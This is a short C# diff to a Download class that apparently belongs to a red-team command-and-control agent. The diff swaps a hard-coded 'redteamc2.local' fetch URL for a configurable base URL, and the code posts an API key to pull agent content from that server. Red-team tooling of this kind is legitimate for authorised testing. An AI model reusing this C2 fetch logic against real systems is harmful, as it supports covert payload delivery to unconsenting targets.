@@ -15,7 +15,7 @@ public class Download
                 { "API_KEY", $"{config.api_key}" }
             };
             var content = new FormUrlEncodedContent(postData);
-            var uri = new Uri($"http://redteamc2.local:8888/endpoints/agent/fetch/{config.agent_install_uuid}");
+            var uri = new Uri($"{config.base_url}/endpoints/agent/fetch/{config.agent_install_uuid}");
             
             var response = client.PostAsync(uri, content);
             var fileName = response.Result.Headers.ToString();
